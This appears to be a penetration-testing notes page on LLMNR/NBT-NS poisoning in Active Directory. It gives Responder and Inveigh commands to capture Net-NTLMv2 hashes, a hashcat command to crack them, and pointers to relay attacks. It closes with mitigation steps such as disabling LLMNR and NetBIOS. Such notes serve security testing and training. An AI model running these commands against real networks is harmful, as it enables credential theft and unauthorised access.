---
tags:
  - Initial-Access
  - LLMNR
  - NETBIOS
  - AD
---
## From Linux
---

[https://github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)
```Python
sudo responder -I eth0 
```
Wait for hashes to come in
Crack them with
```Python
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
## From Windows
---
### **Using Inveigh**
https://github.com/Kevin-Robertson/Inveigh
```Python
Import-Module .\Inveigh.ps1
```
```Python
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
### **C# Inveigh (InveighZero)**
```Python
.\Inveigh.exe
```
We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`. We can type in `GET NTLMV2USERNAMES` and see which usernames we have collected. This is helpful if we want a listing of users to perform additional enumeration against and see which are worth  
attempting to crack offline using Hashcat.

## Abuse
___
Once you receive a response:

you can either crack the Net-NTLMv2 hash

- See: [Hash Cracking](../Credential%20Access%20&%20Harvesting/Hash%20Cracking.md)

Or relay the to authenticate to a service

- See: [Relay Attacks](../Lateral%20Movement/Relay%20Attacks.md)


## Mitigation
---
1. Select "Turn OFF multicast Name Resolution" under Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client in the Group Policy Editor
2. Disable NBT-NS navigate to Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced tab > WINS tab and select "Disable NetBios over TCP/IP". 
**If you cannot disable for whatever reason**
- Require Network Access Control (NAC)
- Require strong passwords: over 14 characters with capitals and symbols and no common words. The better the password, the longer it takes an attacker to crack the hash